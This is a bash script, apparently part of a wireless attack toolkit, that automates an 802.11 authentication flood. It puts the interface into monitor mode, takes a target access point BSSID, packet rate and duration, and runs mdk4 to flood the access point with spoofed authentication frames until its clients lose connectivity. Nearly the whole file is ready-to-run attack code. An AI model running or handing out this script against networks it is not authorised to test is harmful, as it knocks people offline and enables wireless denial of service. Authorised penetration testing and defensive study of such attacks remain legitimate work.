#!/bin/bash
#
# Utility: Authentication Flood using mdk4
#
# Description:
#   Launches an authentication flood attack against a target access point using mdk4.
#   Sends rapid, spoofed 802.11 authentication frames to fill the AP's auth table and disrupt connectivity.
#
# Requirements:
#   - mdk4 must be installed and in PATH
#   - Must be run with sudo/root privileges (handled via watt.py)
#   - Interface must support monitor mode
#
# Usage:
#   ./run_mdk4_auth.sh
#
# Inputs:
#   - Defaults in config.sh
#    - Target BSSID
#    - Packet rate
#    - Duration in seconds
#
# Notes:
#   - Automatically enables monitor mode if needed
#   - Cleans up on SIGINT or timeout using EXIT trap

# Load helpers
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
source "$SCRIPT_DIR/config.sh"
source "$SCRIPT_DIR/print.sh"

# Check mdk4
if ! command -v mdk4 &> /dev/null; then
    print_fail "mdk4 not found. Please install it first."
    exit 0
fi

# Cleanup
cleanup() {
    print_blank
    print_info "Starting cleanup"
    rm -f /tmp/watt_attack_active

    # Check mode
    MODE=$(iw dev "$INTERFACE" info | awk '/type/ {print $2}')
    if [[ "$MODE" != "managed" ]]; then
        print_action "Reverting to Managed mode"
        bash "$SCRIPT_DIR/set-mode-managed.sh"
        print_success "Interface set to Managed mode"
    fi

    exit 0   
}

# Exit traps
trap cleanup EXIT
trap cleanup SIGINT

# Validate config vars
if [[ -z "$INTERFACE" || -z "$T009_AUTH_PPS" || -z "$T009_BSSID" ]]; then
    print_warn "Required variables not defined in config.sh: INTERFACE, T009_AUTH_PPS, or T009_BSSID"
    exit 0
fi

# Display config
echo "Mode         : T009 - Authentication Flood"
echo "Interface    : $INTERFACE"
echo "Target BSSID : $T009_BSSID"
print_blank

# Confirm attack
print_prompt "Proceed with attack? (y/N): "
read -r confirm

if [[ "$confirm" != "y" && "$confirm" != "Y" ]]; then
    print_warn "Cancelled"
    exit 0
fi

# Input target BSSID
while true; do
    print_prompt "Target BSSID [default: ${T009_BSSID}]: "
    read -r BSSID

    BSSID="${BSSID:-$T009_BSSID}"
    
    if [[ "$BSSID" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
        break
    else
        print_fail "Invalid BSSID format. Expected XX:XX:XX:XX:XX:XX"
    fi
done

# Input packet rate
while true; do
    print_prompt "Transmit rate (pps) [default: ${T009_AUTH_PPS}]: "
    read -r PACKET_RATE

    PACKET_RATE="${PACKET_RATE:-$T009_AUTH_PPS}"

    if [[ "$PACKET_RATE" =~ ^[0-9]+$ ]]; then
        break
    else
        print_fail "Invalid input. Enter a numeric value"
    fi
done

# Input duration
while true; do
    print_prompt "Duration (seconds) [default: ${ATTACK_DURATION}]: "
    read -r DURATION

    DURATION="${DURATION:-$ATTACK_DURATION}"
    
    if [[ "$DURATION" =~ ^[0-9]+$ ]]; then
        break
    else
        print_fail "Invalid input. Enter a numeric value"
    fi
done

# Launch attack
echo "T009" > /tmp/watt_attack_active
print_blank
print_info "Starting Attack"

# Check mode
MODE=$(iw dev "$INTERFACE" info | awk '/type/ {print $2}')
if [[ "$MODE" != "monitor" ]]; then
    print_action "Enabling Monitor mode"
    bash "$SCRIPT_DIR/set-mode-monitor.sh"
    print_success "Interface set to Monitor mode"
fi

# Run attack
print_blank
print_info "Running T009 - Authentication Flood for $DURATION seconds"
sudo timeout "$DURATION" mdk4 "$INTERFACE" a -a "$BSSID" -s "$PACKET_RATE"

EXIT_CODE=$?

# Exit check
if [[ "$EXIT_CODE" -eq 124 ]]; then
    print_success "Attack ended"
elif [[ "$EXIT_CODE" -ne 0 ]]; then
    print_fail "mdk4 exited with code $EXIT_CODE"
fi

exit 0